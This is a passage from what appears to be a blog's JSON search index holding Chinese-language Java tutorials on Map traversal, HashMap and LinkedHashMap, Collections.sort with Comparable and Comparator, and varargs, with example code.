&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Entry键值对对象","slug":"java00186Entry键值对对象","date":"2020-04-04T17:24:08.000Z","updated":"2020-04-04T17:25:55.727Z","comments":true,"path":"2020/04/05/java00186Entry键值对对象/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00186Entry键值对对象/","excerpt":"","text":"Entry键值对对象 我们已经知道，Map中存放的是两种对象，一种称为key(键)，一种称为value(值)，它们在在Map中是一一对应关系，这一对对象又称做Map中的一个Entry(项)。Entry将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历Map集合时，就可以从每一个键值对（Entry）对象中获取对应的键与对应的值。 既然Entry表示了一对键和值，那么也同样提供了获取对应键和对应值得方法： public K getKey()：获取Entry对象中的键。 public V getValue()：获取Entry对象中的值。 在Map集合中也提供了获取所有Entry对象的方法： public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet(): 获取到Map集合中所有的键值对对象的集合(Set集合)。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合遍历键找值方式","slug":"java00185Map集合遍历键找值方式","date":"2020-04-04T15:47:55.000Z","updated":"2020-04-04T15:52:24.366Z","comments":true,"path":"2020/04/04/java00185Map集合遍历键找值方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00185Map集合遍历键找值方式/","excerpt":"","text":"Map集合遍历键找值方式 键找值方式：即通过元素中的键，获取键所对应的值 分析步骤： 获取Map中所有的键，由于键是唯一的，所以返回一个Set集合存储所有的键。方法提示:keyset() 遍历键的Set集合，得到每一个键。 根据键，获取键所对应的值。方法提示:get(K key) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;/* Map集合的第一种遍历方式:通过键找值的方式 Map集合中的方法: Set&lt;K&gt; keySet() 返回此映射中包含的键的 Set 视图。 实现步骤: 1.使用Map集合中的方法keySet(),把Map集合所有的key取出来,存储到一个Set集合中 2.遍历set集合,获取Map集合中的每一个key 3.通过Map集合中的方法get(key),通过key找到value */ public class Demo02KeySet &#123; public static void main(String[] args) &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); //1.使用Map集合中的方法keySet(),把Map集合所有的key取出来,存储到一个Set集合中 Set&lt;String&gt; set = map.keySet(); //2.遍历set集合,获取Map集合中的每一个key //使用迭代器遍历Set集合 Iterator&lt;String&gt; it = set.iterator(); while (it.hasNext())&#123; String key = it.next(); //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-------------------\"); //使用增强for遍历Set集合 for(String key : set)&#123; //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-------------------\"); //使用增强for遍历Set集合 for(String key : map.keySet())&#123; //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map接口中的常用方法","slug":"java00184Map接口中的常用方法","date":"2020-04-04T15:23:04.000Z","updated":"2020-04-04T15:36:11.822Z","comments":true,"path":"2020/04/04/java00184Map接口中的常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00184Map接口中的常用方法/","excerpt":"","text":"Map接口中的常用方法 Map接口中定义了很多方法，常用的如下： public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 public V remove(Object key): 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。 public V get(Object key) 根据指定的键，在Map集合中获取对应的值。 boolean containsKey(Object key) 判断集合中是否包含指定的键。 public Set&lt;K&gt; keySet(): 获取Map集合中所有的键，存储到Set集合中。 public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet(): 获取到Map集合中所有的键值对对象的集合(Set集合)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Map;public class Demo01Map &#123; public static void main(String[] args) &#123; show04(); &#125; /* boolean containsKey(Object key) 判断集合中是否包含指定的键。 包含返回true,不包含返回false */ private static void show04() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); boolean b1 = map.containsKey(\"赵丽颖\"); System.out.println(\"b1:\"+b1);//b1:true boolean b2 = map.containsKey(\"赵颖\"); System.out.println(\"b2:\"+b2);//b2:false &#125; /* public V get(Object key) 根据指定的键，在Map集合中获取对应的值。 返回值: key存在,返回对应的value值 key不存在,返回null */ private static void show03() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); Integer v1 = map.get(\"杨颖\"); System.out.println(\"v1:\"+v1);//v1:165 Integer v2 = map.get(\"迪丽热巴\"); System.out.println(\"v2:\"+v2);//v2:null &#125; /* public V remove(Object key): 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。 返回值:V key存在,v返回被删除的值 key不存在,v返回null */ private static void show02() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); System.out.println(map);//&#123;林志玲=178, 赵丽颖=168, 杨颖=165&#125; Integer v1 = map.remove(\"林志玲\"); System.out.println(\"v1:\"+v1);//v1:178 System.out.println(map);//&#123;赵丽颖=168, 杨颖=165&#125; //int v2 = map.remove(\"林志颖\");//自动拆箱 NullPointerException Integer v2 = map.remove(\"林志颖\"); System.out.println(\"v2:\"+v2);//v2:null System.out.println(map);//&#123;赵丽颖=168, 杨颖=165&#125; &#125; /* public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 返回值:v 存储键值对的时候,key不重复,返回值V是null 存储键值对的时候,key重复,会使用新的value替换map中重复的value,返回被替换的value值 */ private static void show01() &#123; //创建Map集合对象,多态 Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); String v1 = map.put(\"李晨\", \"范冰冰1\"); System.out.println(\"v1:\"+v1);//v1:null String v2 = map.put(\"李晨\", \"范冰冰2\"); System.out.println(\"v2:\"+v2);//v2:范冰冰1 System.out.println(map);//&#123;李晨=范冰冰2&#125; map.put(\"冷锋\",\"龙小云\"); map.put(\"杨过\",\"小龙女\"); map.put(\"尹志平\",\"小龙女\"); System.out.println(map);//&#123;杨过=小龙女, 尹志平=小龙女, 李晨=范冰冰2, 冷锋=龙小云&#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map常用子类","slug":"java00183Map常用子类","date":"2020-04-04T15:17:33.000Z","updated":"2020-04-04T15:26:20.035Z","comments":true,"path":"2020/04/04/java00183Map常用子类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00183Map常用子类/","excerpt":"","text":"Map常用子类 通过查看Map接口描述，看到Map有多个子类，这里我们主要讲解常用的HashMap集合、LinkedHashMap集合。 HashMap&lt;K,V&gt;：存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 LinkedHashMap&lt;K,V&gt;：HashMap下有个子类LinkedHashMap，存储数据采用的哈希表结构+链表结构。通过链表结构可以保证元素的存取顺序一致；通过哈希表结构可以保证的键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 tips：Map接口中的集合都有两个泛型变量&lt;K,V&gt;,在使用时，要为两个泛型变量赋予数据类型。两个泛型变量&lt;K,V&gt;的数据类型可以相同，也可以不同。 java.util.HashMap&lt;k,v&gt;集合 implements Map&lt;k,v&gt;接口 ​ HashMap集合的特点: ​ 1.HashMap集合底层是哈希表:查询的速度特别的快 ​ JDK1.8之前:数组+单向链表 ​ JDK1.8之后:数组+单向链表|红黑树(链表的长度超过8):提高查询的速度 ​ 2.hashMap集合是一个无序的集合,存储元素和取出元素的顺序有可能不一致 java.util.LinkedHashMap&lt;k,v&gt;集合extends HashMap&lt;k,v&gt;集合 LinkedHashMap的特点: ​ 1.LinkedHashMap集合底层是哈希表+链表(保证迭代的顺序) ​ 2.LinkedHashMap集合是一个有序的集合,存储元素和取出元素的顺序是一致的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合概述","slug":"java00182Map集合概述","date":"2020-04-04T15:10:45.000Z","updated":"2020-04-04T15:15:55.378Z","comments":true,"path":"2020/04/04/java00182Map集合概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00182Map集合概述/","excerpt":"","text":"Map集合概述 现实生活中，我们常会看到这样的一种集合：IP地址与主机名，身份证号与个人，系统用户名与系统用户对象等，这种一一对应的关系，就叫做映射。Java提供了专门的集合类用来存放这种对象关系的对象，即java.util.Map接口。 我们通过查看Map接口描述，发现Map接口下的集合与Collection接口下的集合，它们存储数据的形式不同，如下图。 Collection中的集合，元素是孤立存在的（理解为单身），向集合中存储元素采用一个个元素的方式存储。 Map中的集合，元素是成对存在的(理解为夫妻)。每个元素由键与值两部分组成，通过键可以找对所对应的值。 Collection中的集合称为单列集合，Map中的集合称为双列集合。 需要注意的是，Map中的集合不能包含重复的键，值可以重复；每个键只能对应一个值。 java.util.Map&lt;k,v&gt;集合 Map集合的特点: 1.Map集合是一个双列集合,一个元素包含两个值(一个key,一个value) 2.Map集合中的元素,key和value的数据类型可以相同,也可以不同 3.Map集合中的元素,key是不允许重复的,value是可以重a复的 4.Map集合中的元素,key和value是一一对应","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java_Collection集合总结","slug":"java00181总结001","date":"2020-04-02T19:21:09.000Z","updated":"2020-04-03T15:58:27.788Z","comments":true,"path":"2020/04/03/java00181总结001/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/03/java00181总结001/","excerpt":"","text":"list集合排序 Collections.sort(List&lt;T&gt; list) 要重写Comparable接口中的compareTo方法 Collections.sort(List&lt;T&gt; list，Comparator&lt;? super T&gt;) 要从写Comparator类中的compare方法 使用匿名内部类重写 往集合添加元素 Collections.addAll(Collection&lt;T&gt; c, T... elements) 打乱集合顺序 Collections.shuffle(List&lt;?&gt; list) 集合： 1.集合是java中提供的一种容器，可以用来存储多个数据。 2.长度是可变的. 3.存储的元素是对象 集合框架介绍 存储结构可以分为两大类 1.单列集合java.util.Collection 2.双列集合java.util.Map Collection是单列集合类的根接口 Collection有两个子接口: java.util.List java.util.Set List的特点是元素有序、元素可重复 . Set的特点是元素无序，而且不可重复。 List接口的主要实现类有 1.java.util.ArrayList 2.java.util.LinkedList Set接口的主要实现类有 1.java.util.HashSet 2.java.util.TreeSet 单列集合共性的方法 public boolean add(E e)：把给定的对象添加到当前集合中 。 public void clear() :清空集合中所有的元素。 public boolean remove(E e): 把给定的对象在当前集合中删除。 public boolean contains(E e): 判断当前集合中是否包含给定的对象。 public boolean isEmpty(): 判断当前集合是否为空。 public int size(): 返回集合中元素的个数。 public Object[] toArray(): 把集合中的元素，存储到数组中。 Iterator接口 迭代器(对集合进行遍历) 迭代器的使用步骤(重点): 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) Iterator&lt;类名&gt; it = 集合对象.iterator(); 2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 12while(it.hasNext())&#123;&#125; 3.使用Iterator接口中的方法next取出集合中的下一个元素 1类名 o = it.next(); 增强for循环 底层使用的也是迭代器 JDK1.5之后出现的新特性 所有的单列集合都可以使用增强for public interface Iterable&lt;T&gt;实现这个接口允许对象成为 “foreach” 语句的目标 123for(集合/数组的数据类型 变量名: 集合名/数组名)&#123;sout(变量名);&#125; 泛型的概念 泛型是一种未知类型,当不确定使用什么类型的时候,可以使用泛型 定义和使用含有泛型的类 123修饰符 class 类名&lt;代表泛型的变量&gt;&#123; &#125; 定义和使用含有泛型的方法 泛型定义在方法的修饰符和返回值类型之间 含有泛型的方法,在调用方法的时候确定泛型的数据类型 传递什么类型的参数,泛型就是什么类型 123修饰符 &lt;泛型&gt; 返回值类型 方法名(参数列表(使用泛型))&#123;方法体;&#125; 定义和使用含有泛型的接口 12修饰符 interface 接口名&lt;代表泛型的变量&gt; &#123; &#125; 使用有两种方法 1.在实现类中指定泛型接口类型 12public class A implements 接口名&lt;String&gt;&#123;&#125; 2.接口使用什么泛型,类就使用什么泛型 12修饰符 interface 接口名&lt;T&gt; &#123; &#125; 12public class A&lt;T&gt; implements 接口名&lt;T&gt;&#123;&#125; 泛型通配符 使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示 . 使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 ?:代表任意的数据类型 不能创建对象使用 只能作为方法的参数使用 泛型的上限： 格式：类型名称 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 对象名称 意义： 只能接收该类型及其父类型 12public static void printArray(ArrayList&lt;?&gt; list)&#123;&#125; 12345// 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125;// 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125; 数据结构 链表 查询慢,增删快. 数组 查询快,增删慢. 队列 先进先出 栈 先进后出 红黑树 节点可以是红色的或者黑色的 根节点是黑色的 叶子节点(空节点)是黑色的 每个红色节点的字节点都是黑色的 任何一个节点到每一个叶子节点的所有路径上黑色节点相同 List集合常用方法 public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 索引越界异常 IndexOutOfBoundsException:索引越界异常,集合会报 ArrayIndexOutOfBoundsException:数组索引越界异常 StringIndexOutOfBoundsException:字符串索引越界异常 ArrayList集合 使用的是数组结构,查询快,增删慢 LinkedList集合 数据存储的结构是链表结构 ( 双向链表 ) 方便元素添加、删除的集合 public void addFirst(E e):将指定元素插入此列表的开头。 public void addLast(E e):将指定元素添加到此列表的结尾。 public E getFirst():返回此列表的第一个元素。 public E getLast():返回此列表的最后一个元素。 public E removeFirst():移除并返回此列表的第一个元素。 public E removeLast():移除并返回此列表的最后一个元素。 public E pop():从此列表所表示的堆栈处弹出一个元素。 public void push(E e):将元素推入此列表所表示的堆栈。 public boolean isEmpty()：如果列表不包含元素，则返回true。 public E remove(int index) 移除此列表中指定位置处的元素。将任何后续元素向左移（从索引中减 1）。返回从列表中删除的元素。 HashSet集合 是Set接口的一个实现类 存储的元素是不可重复的 元素都是无序的 底层的实现其实是一个java.util.HashMap支持 根据对象的哈希值来确定元素在集合中的存储位置 保证元素唯一性的方式依赖于：hashCode与equals方法 哈希值 JDK1.8之前，哈希表底层采用数组+链表实现的 JDK1.8 以后, 哈希表存储采用数组+链表+红黑树实现 ,当链表长度超过阈值（8）时，将链表转换为红黑树 自定义的类需要重写 hashCode和equals方法 保证对象其唯一 Set集合存储元素不重复的原理 set集合在调用add时会调用hashCode()和equals()判断元素是否重复 hashCode()会生成一个哈希值并存储在数组里 如果哈希值相同,称为哈希冲突,会在哈希值对应的链表或红黑树中查看元素是否相同,如果相同则抛弃 HashSet存储自定义类型元素 HashSet存储自定义类型元素 set集合报错元素唯一: 存储的元素(String,Integer,…Student,Person…),必须重写hashCode方法和equals方法 123456789101112131415161718192021public class Person &#123; private int age; private String name; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; //下面是比较元素 return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125;&#125; LinkedHashSet集合 java.util.LinkedHashSet集合 extends HashSet集合 LinkedHashSet集合特点: 底层是一个哈希表(数组+链表/红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序 LinkedHashSet&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); 可变参数 ​ 可变参数底层就是一个数组 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 123修饰符 返回值类型 方法名(数据类型...变量名)&#123; &#125; Collections集合工具类的方法addAll和shuffle java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 public static void shuffle(List&lt;?&gt; list)打乱顺序:打乱集合顺序。 12Collections.addAll(list,\"a\",\"b\",\"c\",\"d\",\"e\");Collections.shuffle(list); Collections集合工具类的方法sort(List) 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） public static&lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序 sort(List&lt;T&gt; list)使用前提 被排序的集合里边存储的元素,必须实现Comparable,重写接口中的方法compareTo定义排序的规则 1Collections.sort(list01);//默认是升序 12345678910111213141516public class Person implements Comparable&lt;Person&gt;&#123; private int age; public int getAge() &#123; return age; &#125; //重写排序的规则 @Override public int compareTo(Person o) &#123; //return 0;//认为元素都是相同的 //自定义比较的规则,比较两个人的年龄(this,参数Person) //return this.getAge() - o.getAge();//年龄升序排序 //年龄降序排序公式: -(o.getAge() - this.getAge()) return o.getAge() - this.getAge();//年龄升序排序 &#125;&#125; Collections集合工具类的方法sort(List,Comparator) java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; ):将集合中元素按照指定规则排序。 Comparator:相当于找一个第三方的裁判,比较两个 Comparator的排序规则: o1-o2:升序 o2 - o1 降序 12345678Collections.sort(list01, new Comparator&lt;Integer&gt;() &#123; //重写比较的规则 @Override public int compare(Integer o1, Integer o2) &#123; //return o1-o2;//升序 return o2-o1;//降序 &#125;&#125;); 123456789101112//扩展:了解Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 int result = o1.getAge()-o2.getAge(); //如果两个人年龄相同,再使用姓名的第一个字比较 if(result==0)&#123; result = o1.getName().charAt(0)-o2.getName().charAt(0); &#125; return result; &#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[{"name":"Java总结","slug":"Java总结","permalink":"https://xiaowuyoucy.github.io/tags/Java总结/"}]},{"title":"java_Collections集合工具类的方法_sort(List,Comparator)","slug":"java00180-Collections集合工具类的方法-sort-List-Comparator","date":"2020-03-21T18:04:59.000Z","updated":"2020-03-21T18:10:50.461Z","comments":true,"path":"2020/03/22/java00180-Collections集合工具类的方法-sort-List-Comparator/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00180-Collections集合工具类的方法-sort-List-Comparator/","excerpt":"","text":"Collections集合工具类的方法_sort(List,Comparator) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;import java.util.Comparator;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; ):将集合中元素按照指定规则排序。 Comparator和Comparable的区别 Comparable:自己(this)和别人(参数)比较,自己需要实现Comparable接口,重写比较的规则compareTo方法 Comparator:相当于找一个第三方的裁判,比较两个 Comparator的排序规则: o1-o2:升序 */public class Demo03Sort &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(3); list01.add(2); System.out.println(list01);//[1, 3, 2] Collections.sort(list01, new Comparator&lt;Integer&gt;() &#123; //重写比较的规则 @Override public int compare(Integer o1, Integer o2) &#123; //return o1-o2;//升序 return o2-o1;//降序 &#125; &#125;); System.out.println(list01); ArrayList&lt;Student&gt; list02 = new ArrayList&lt;&gt;(); list02.add(new Student(\"a迪丽热巴\",18)); list02.add(new Student(\"古力娜扎\",20)); list02.add(new Student(\"杨幂\",17)); list02.add(new Student(\"b杨幂\",18)); System.out.println(list02); /*Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 return o1.getAge()-o2.getAge(); &#125; &#125;);*/ //扩展:了解 Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 int result = o1.getAge()-o2.getAge(); //如果两个人年龄相同,再使用姓名的第一个字比较 if(result==0)&#123; result = o1.getName().charAt(0)-o2.getName().charAt(0); &#125; return result; &#125; &#125;); System.out.println(list02); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.itheima.demo05.Collections;public class Student &#123; private String name; private int age; public Student() &#123; &#125; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return \"Student&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Collections集合工具类的方法_sort(List)","slug":"java00179-Collections集合工具类的方法-sort（List）","date":"2020-03-21T17:53:06.000Z","updated":"2020-03-21T18:03:47.641Z","comments":true,"path":"2020/03/22/java00179-Collections集合工具类的方法-sort（List）/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00179-Collections集合工具类的方法-sort（List）/","excerpt":"","text":"Collections集合工具类的方法_sort(List) 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序。 注意: sort(List&lt;T&gt; list)使用前提 被排序的集合里边存储的元素,必须实现Comparable,重写接口中的方法compareTo定义排序的规则 Comparable接口的排序规则: 自己(this)-参数:升序 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） */public class Demo02Sort &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(3); list01.add(2); System.out.println(list01);//[1, 3, 2] //public static &lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序。 Collections.sort(list01);//默认是升序 System.out.println(list01);//[1, 2, 3] ArrayList&lt;String&gt; list02 = new ArrayList&lt;&gt;(); list02.add(\"a\"); list02.add(\"c\"); list02.add(\"b\"); System.out.println(list02);//[a, c, b] Collections.sort(list02); System.out.println(list02);//[a, b, c] ArrayList&lt;Person&gt; list03 = new ArrayList&lt;&gt;(); list03.add(new Person(\"张三\",18)); list03.add(new Person(\"李四\",20)); list03.add(new Person(\"王五\",15)); System.out.println(list03);//[Person&#123;name='张三', age=18&#125;, Person&#123;name='李四', age=20&#125;, Person&#123;name='王五', age=15&#125;] Collections.sort(list03); System.out.println(list03); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.itheima.demo05.Collections;public class Person implements Comparable&lt;Person&gt;&#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; //重写排序的规则 @Override public int compareTo(Person o) &#123; //return 0;//认为元素都是相同的 //自定义比较的规则,比较两个人的年龄(this,参数Person) //return this.getAge() - o.getAge();//年龄升序排序 return o.getAge() - this.getAge();//年龄升序排序 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Collections集合工具类的方法_addAll和shuffle","slug":"java00178-Collections集合工具类的方法-addAll和shuffle","date":"2020-03-21T17:49:27.000Z","updated":"2020-03-21T17:50:17.605Z","comments":true,"path":"2020/03/22/java00178-Collections集合工具类的方法-addAll和shuffle/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00178-Collections集合工具类的方法-addAll和shuffle/","excerpt":"","text":"Collections集合工具类的方法_addAll和shuffle 123456789101112131415161718192021222324252627282930package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： - public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 - public static void shuffle(List&lt;?&gt; list) 打乱顺序:打乱集合顺序。 */public class Demo01Collections &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); //往集合中添加多个元素 /*list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"e\");*/ //public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 Collections.addAll(list,\"a\",\"b\",\"c\",\"d\",\"e\"); System.out.println(list);//[a, b, c, d, e] //public static void shuffle(List&lt;?&gt; list) 打乱顺序:打乱集合顺序。 Collections.shuffle(list); System.out.println(list);//[b, d, c, a, e], [b, d, c, a, e] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_可变参数","slug":"java00177-可变参数","date":"2020-03-21T17:41:38.000Z","updated":"2020-03-21T17:46:02.048Z","comments":true,"path":"2020/03/22/java00177-可变参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00177-可变参数/","excerpt":"","text":"可变参数: 是JDK1.5之后出现的新特性 使用前提: ​ 当方法的参数列表数据类型已经确定,但是参数的个数不确定,就可以使用可变参数. 使用格式: 定义方法时使用 123修饰符 返回值类型 方法名(数据类型...变量名)&#123; &#125; 可变参数的原理: ​ 可变参数底层就是一个数组,根据传递参数个数不同,会创建不同长度的数组,来存储这些参数 ​ 传递的参数个数,可以是0个(不传递),1,2…多个 可变参数的注意事项 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.itheima.demo04.VarArgs;public class Demo01VarArgs &#123; public static void main(String[] args) &#123; //int i = add(); //int i = add(10); int i = add(10,20); //int i = add(10,20,30,40,50,60,70,80,90,100); System.out.println(i); method(\"abc\",5.5,10,1,2,3,4); &#125; /* 可变参数的注意事项 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 */ /*public static void method(int...a,String...b)&#123; &#125;*/ /*public static void method(String b,double c,int d,int...a)&#123; &#125;*/ //可变参数的特殊(终极)写法 public static void method(Object...obj)&#123; &#125; /* 定义计算(0-n)整数和的方法 已知:计算整数的和,数据类型已经确定int 但是参数的个数不确定,不知道要计算几个整数的和,就可以使用可变参数 add(); 就会创建一个长度为0的数组, new int[0] add(10); 就会创建一个长度为1的数组,存储传递来过的参数 new int[]&#123;10&#125;; add(10,20); 就会创建一个长度为2的数组,存储传递来过的参数 new int[]&#123;10,20&#125;; add(10,20,30,40,50,60,70,80,90,100); 就会创建一个长度为10的数组,存储传递来过的参数 new int[]&#123;10,20,30,40,50,60,70,80,90,100&#125;; */ public static int add(int...arr)&#123; //System.out.println(arr);//[I@2ac1fdc4 底层是一个数组 //System.out.println(arr.length);//0,1,2,10 //定义一个初始化的变量,记录累加求和 int sum = 0; //遍历数组,获取数组中的每一个元素 for (int i : arr) &#123; //累加求和 sum += i; &#125; //把求和结果返回 return sum; &#125; //定义一个方法,计算三个int类型整数的和 /*public static int add(int a,int b,int c)&#123; return a+b+c; &#125;*/ //定义一个方法,计算两个int类型整数的和 /*public static int add(int a,int b)&#123; return a+b; 